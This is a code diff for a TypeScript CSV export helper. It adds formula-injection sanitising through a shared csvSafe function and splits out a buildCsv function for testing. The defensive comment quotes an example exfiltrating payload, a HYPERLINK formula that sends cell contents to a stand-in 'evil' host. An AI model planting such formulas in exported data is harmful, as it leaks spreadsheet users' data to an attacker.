@@ -21,6 +21,7 @@
  * it. `downloadCsv` keeps the ResultsFooter's row-building signature;
  * `downloadCsvFile` takes CSV a caller has already built.
  */
+import { csvSafe } from '@forma360/shared/csv';
 import { toast } from 'sonner';
 
 /** Long enough for the browser to have started the transfer. */
@@ -70,12 +71,23 @@ export function downloadCsvFile(
   downloadFile(csv, filename, 'text/csv;charset=utf-8;', options);
 }
 
-/** Quote when the cell contains a comma, quote, or newline (RFC 4180). */
+/**
+ * Quote when the cell contains a comma, quote, or newline (RFC 4180), and
+ * neutralise spreadsheet formulas first.
+ *
+ * RFC quoting alone does NOT stop formula execution — Excel and Sheets strip
+ * the quotes on import and then evaluate a leading `=`, `+`, `-` or `@`. This
+ * path exported contractor names and permit titles, both free text, so a
+ * contractor named `=HYPERLINK("http://evil/"&A1,"Click")` executed on the
+ * practitioner's machine. The server-side exporter has always used `csvSafe`
+ * for exactly this; the client-side copy grew up separately and did not.
+ */
 function escapeCell(value: string): string {
-  if (/[",\n\r]/.test(value)) {
-    return `"${value.replace(/"/g, '""')}"`;
+  const safe = csvSafe(value);
+  if (/[",\n\r]/.test(safe)) {
+    return `"${safe.replace(/"/g, '""')}"`;
   }
-  return value;
+  return safe;
 }
 
 /**
@@ -90,14 +102,21 @@ export function downloadCsv(
   rows: string[][],
   options: DownloadOptions = {},
 ): void {
-  const lines = [headers, ...rows].map((cells) => cells.map(escapeCell).join(','));
   // Prepend a BOM so Excel reads UTF-8 (accented names, £, …) correctly.
   downloadCsvFile(
-    '﻿' + lines.join('\r\n'),
+    '﻿' + buildCsv(headers, rows),
     filename.endsWith('.csv') ? filename : `${filename}.csv`,
     options,
   );
 }
+
+/** Serialise header + rows to CSV text. Split out so it can be tested. */
+function buildCsv(headers: string[], rows: string[][]): string {
+  return [headers, ...rows].map((cells) => cells.map(escapeCell).join(',')).join('\r\n');
+}
+
+/** Test-only view of the serialiser; the download side needs a DOM. */
+export const buildCsvForTests = buildCsv;
 
 /** `YYYY-MM-DD`, for stamping an export filename. */
 export function todayStamp(): string {
